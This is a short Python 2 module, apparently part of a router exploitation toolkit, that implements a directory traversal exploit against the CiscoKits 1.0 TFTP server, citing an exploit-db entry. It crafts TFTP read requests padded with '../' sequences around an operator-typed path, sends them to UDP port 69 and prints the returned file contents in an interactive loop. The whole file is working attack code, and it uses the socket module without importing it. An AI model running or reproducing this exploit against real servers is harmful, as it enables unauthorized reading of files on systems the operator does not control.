from ..router_vuln import RouterVuln
import util

__router__ = 'CiscoKits 1.0 TFTP'
__vuln__='Directory Traversal'
class DirectoryTraversal(RouterVuln):
	"""Exploit a directory traversal vulnerability
	   http://www.exploit-db.com/exploits/17619/
	"""
	
	def __init__(self):
		super(DirectoryTraversal,self).__init__()

	def send(self, retr):
		"""Send and receive"""
		try:
			sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			sock.settimeout(5)
			sock.sendto(retr,(self.ip,69))
			data = sock.recv(1024)
			sock.close()
		except Exception,e:
			util.Error('Error with host: %s'%e)
			return None
		return data.strip()

	def run(self):
		try:
			while True:
				retr = raw_input('C:\\')
				retr = retr.replace('/','\\')

				pkt = '\x00\x01'
				pkt += '../' * 10 + retr + '\x00'
				pkt += 'netascii\x00'
				data = self.send(pkt)
				print data
		except:
			return
